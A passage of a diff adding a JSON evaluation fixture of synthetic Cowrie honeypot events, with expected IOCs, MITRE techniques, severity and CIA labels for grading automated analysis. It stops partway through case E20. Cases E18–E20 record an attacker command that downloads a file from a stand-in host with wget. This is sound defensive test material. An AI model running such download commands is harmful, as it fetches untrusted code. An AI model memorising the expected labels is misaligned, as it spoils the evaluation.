@@ -1,0 +1,1754 @@
+{
+  "metadata": {
+    "version": "h04-inicial-1",
+    "independiente": true,
+    "revision_experta": "pendiente",
+    "origen": "Etiquetas preliminares de lectura manual de evidencia sintética, definidas antes de ejecutar predicciones.",
+    "particion": "evaluacion",
+    "ajuste_separado": "tests/fixtures/rag_retrieval_dev.json",
+    "nota": "E24 es un control de límite con referencia externa sintética. La interfaz operativa de Cowrie no autentica dicha referencia."
+  },
+  "casos": [
+    {
+      "id": "E01",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.session.connect",
+          "protocol": "ssh",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S0",
+        "justificacion": "Únicamente conexión SSH registrada."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E02",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_proxy",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.session.connect",
+          "protocol": "ssh",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-Fixture",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S0",
+        "justificacion": "Conexión y banner sin autenticación ni acción defensivamente relevante."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E03",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_llm",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.session.connect",
+          "protocol": "ssh",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.client.kex",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 3,
+          "timestamp": "2026-11-24T12:00:03+00:00",
+          "eventid": "cowrie.session.closed",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "registrado"
+        },
+        {
+          "evento": 3,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S0",
+        "justificacion": "Negociación y cierre observados, sin evidencia de alteración."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2,
+          3
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E04",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-04-A",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Un rechazo de autenticación no acredita adivinación reiterada."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E05",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-05-A",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-05-A",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 3,
+          "timestamp": "2026-11-24T12:00:03+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-05-A",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "registrado"
+        },
+        {
+          "evento": 3,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Tres registros del mismo valor no representan tres contraseñas distintas."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2,
+          3
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E06",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_proxy",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.login.success",
+          "username": "fixture-account",
+          "password": "Fixture-06-A",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "El señuelo aceptó el acceso; no hay datos de una cuenta real."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E07",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "uname -a",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1082",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Consulta de información del sistema recibida."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E08",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_proxy",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "whoami",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1033",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Consulta de identidad recibida; el comando no da el resultado."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E09",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_llm",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "ls /tmp",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1083",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Solicitud de enumeración de directorio en señuelo."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E10",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "ps -ef",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1057",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Solicitud de listado de procesos, sin salida evidenciada."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E11",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "ip addr show",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1016",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Consulta de interfaz local, sin prueba de reconocimiento de terceros."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E12",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "pwd",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Interacción simple con contexto operativo limitado, sin técnica aplicable."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E13",
+      "particion": "evaluacion",
+      "modalidad": "desconocido",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "printf 'lab fixture'",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Entrada literal de un comando ordinario, con modalidad indeterminada."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E14",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_llm",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.llm.response",
+          "response": "Simulación: el archivo se habría transferido."
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "salida_simulada"
+        }
+      ],
+      "iocs_esperados": [],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "No evaluable",
+        "justificacion": "Solo hay texto generado por el señuelo; no acredita ejecución."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E15",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "pwd; date",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "no_determinable"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "No evaluable",
+        "justificacion": "Una entrada compuesta fuera del analizador disponible se registra sin afirmar ejecución."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E16",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.failed",
+          "input": "date"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "fallido"
+        }
+      ],
+      "iocs_esperados": [],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "No evaluable",
+        "justificacion": "Fallo aislado sin acción anterior ni conexión asignable."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E17",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-17-A",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-17-B",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 3,
+          "timestamp": "2026-11-24T12:00:03+00:00",
+          "eventid": "cowrie.login.failed",
+          "username": "fixture-account",
+          "password": "Fixture-17-C",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "registrado"
+        },
+        {
+          "evento": 3,
+          "estado": "registrado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1110.001",
+          "eventos": [
+            1,
+            2,
+            3
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S2",
+        "justificacion": "Tres candidatos distintos de contraseña rechazados para la misma cuenta y origen."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "moderado"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2,
+          3
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E18",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "wget https://updates.eval.local/sample.bin",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        },
+        {
+          "tipo": "URL",
+          "valor": "https://updates.eval.local/sample.bin"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1105",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S2",
+        "justificacion": "Solicitud de transferencia entrante con recurso identificable."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO02",
+          "potencial": "moderado"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E19",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.session.file_download",
+          "url": "https://updates.eval.local/sample.bin",
+          "shasum": "a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4",
+          "size": 1024,
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "resultado_observado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        },
+        {
+          "tipo": "URL",
+          "valor": "https://updates.eval.local/sample.bin"
+        },
+        {
+          "tipo": "Hash",
+          "valor": "a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1105",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S2",
+        "justificacion": "Un registro de Shell con tamaño y hash documenta la descarga al señuelo."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO02",
+          "potencial": "moderado"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E20",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "wget https://updates.eval.local/sample.bin",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.session.file_download.failed",
+          "url": "https://updates.eval.local/sample.bin",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        },
+        {
+          "evento": 2,
+          "estado": "fallido"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        },
+        {
+          "tipo": "URL",
+          "valor": "https://updates.eval.local/sample.bin"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1105",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S2",
+        "justificacion": "La solicitud funda la técnica y el segundo evento registra el fallo."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
